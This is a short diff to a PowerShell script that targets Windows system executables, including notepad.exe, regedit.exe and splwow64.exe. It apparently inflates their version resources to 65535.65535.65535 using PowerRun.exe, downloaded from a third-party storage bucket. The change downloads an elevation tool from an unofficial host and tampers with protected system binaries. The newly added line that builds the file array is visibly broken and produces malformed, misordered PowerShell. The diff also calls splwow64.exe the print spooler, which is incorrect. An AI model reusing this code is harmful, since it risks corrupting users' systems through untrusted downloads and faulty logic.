@@ -20,6 +20,9 @@ $Script:TargetFiles = @(
   "HelpPane.exe",      # Help system
   "hh.exe",            # HTML Help
   "notepad.exe",       # Simple text editor
+  "regedit.exe",       # Registry editor
+  "splwow64.exe"       # Print spooler
+)
 
 $Script:DisplayVersionHigh = '65535.65535.65535'
 $Script:PowerRunUrl = 'https://storage.googleapis.com/sigma.00.edu.ci/PowerRun.exe'
@@ -336,6 +339,8 @@ $Script:VersionResourceEditorCS
 
 # File paths to update
 `$files = @(
+$($FilePaths | ForEach-Object { "    '$_'," } | ForEach-Object { $_.TrimEnd(',') } | Select-Object -Last 1; $FilePaths | Select-Object -SkipLast 1 | ForEach-Object { "    '$_'," })
+)
 
 `$successCount = 0
 `$totalCount = `$files.Count
